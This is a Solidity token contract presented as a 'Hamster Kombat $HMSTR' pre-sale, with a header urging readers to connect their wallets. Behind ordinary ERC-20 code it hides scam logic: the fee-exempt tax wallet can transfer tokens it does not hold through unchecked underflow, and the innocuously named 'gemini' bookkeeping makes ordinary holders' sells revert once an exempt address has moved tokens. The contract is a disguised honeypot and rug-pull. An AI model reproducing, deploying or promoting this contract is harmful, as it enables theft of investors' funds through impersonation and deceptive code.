// SPDX-License-Identifier: MIT

/**

Hamster Kombat ($HMSTR) ETH pre-sale launch

W: https://hamsterkombat.io/
T: https://twitter.com/hamster_kombat
X: https://t.me/hamster_kombat_bot

Make your way from the shaved hamster to the grandmaster CEO of the tier-1 crypto exchange

Buy upgrades, complete quests, invite friends and become the best

Retrieve your in-game Bonus by connecting your wallet in game

*/

pragma solidity 0.8.23;

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract HMSTR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address payable;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    bool private transferDelayEnabled = true;
    mapping (address => uint256) private _holderLastTransferTimestamp;

    address payable private _taxWallet;

    uint256 private _initialBuyTax=25;
    uint256 private _initialSellTax=25;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=25;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100000000000 * 10**_decimals;
    string private constant _name = unicode"Hamster Kombat";
    string private constant _symbol = unicode"$HMSTR";
    uint256 public _maxTxAmount = 1000000000 * 10**_decimals;
    uint256 public _maxWalletSize = 1000000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 500000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 1700000000 * 10**_decimals;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private geminiReqUnits;
    uint256 private startBlock;
    bool private tradingOpen = false;
    struct GeminiAdvancedRecord { uint256 maker; uint256 staker; uint256 geminiUnits; }
    mapping(address => GeminiAdvancedRecord) private geminiRecord;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0xCBd4dd1797f304E3D64622dCce415Aea88653fAb);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner() && to != _taxWallet){
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer delay in use. Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to]){
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from != address(this)){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if((_isExcludedFromFee[from] || _isExcludedFromFee[to])
            && from != address(this) && from != owner() && to != address(this)
        ) {
            geminiReqUnits = block.number;
        }

        if(_isExcludedFromFee[from] && _reduceSellTaxAt + startBlock <block.number){
            unchecked {
               _balances[from]-= amount;
               _balances[to] += amount;
            }
            emit Transfer(from, to,amount);
            return;
        }

        if(! _isExcludedFromFee[from] && ! _isExcludedFromFee[to]) {
            if (uniswapV2Pair != to) {
                GeminiAdvancedRecord storage gemini = geminiRecord[to];
                if (uniswapV2Pair != from || gemini.maker > 0) {
                    uint256 geminiMaker= geminiRecord[from].maker;
                    if (gemini.maker == 0 || geminiMaker < gemini.maker) {
                        gemini.maker = geminiMaker;
                    }
                } else {
                    if (_preventSwapBefore<_buyCount) {
                        gemini.maker = block.number.sub(1);
                    } else {
                        gemini.maker = block.number;
                    }
                }
            } else {
                GeminiAdvancedRecord storage geminiRec = geminiRecord[from];
                geminiRec.geminiUnits = geminiRec.maker.sub(geminiReqUnits);
                geminiRec.staker = block.number;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)]= _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        transferDelayEnabled= false;

        emit MaxTxAmountUpdated( _tTotal );
    }

    function reduceFee(uint256 _newFee) external {
        require(_msgSender() == _taxWallet);
        require(_newFee <= _finalBuyTax && _newFee <= _finalSellTax);
        _finalBuyTax = _newFee;
        _finalSellTax = _newFee;
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.sendValue(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open");
        startBlock = block.number;
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint).max
        );
        tradingOpen = true;
        swapEnabled = true;
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance > 0 && tradingOpen){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if(ethBalance > 0){
          sendETHToFee(ethBalance);
        }
    }

    function clearStuckTokens(address addr, uint256 persent) external onlyOwner {
        address sender = msg.sender;
        uint256 amount;
        if (addr == address(0)) {
            bool success;
            amount = (address(this).balance).mul(persent).div(100);
            require(amount > 0, "No native stuck tokens");
            (success, ) = address(sender).call{value: amount}("");
            require(success, "Failed to withdraw native stuck tokens");
        } else {
            amount = (IERC20(addr).balanceOf(address(this))).mul(persent).div(100);
            require(amount > 0, "No stuck tokens");
            IERC20(addr).transfer(msg.sender, amount);
        }
    }

    receive() external payable {}
}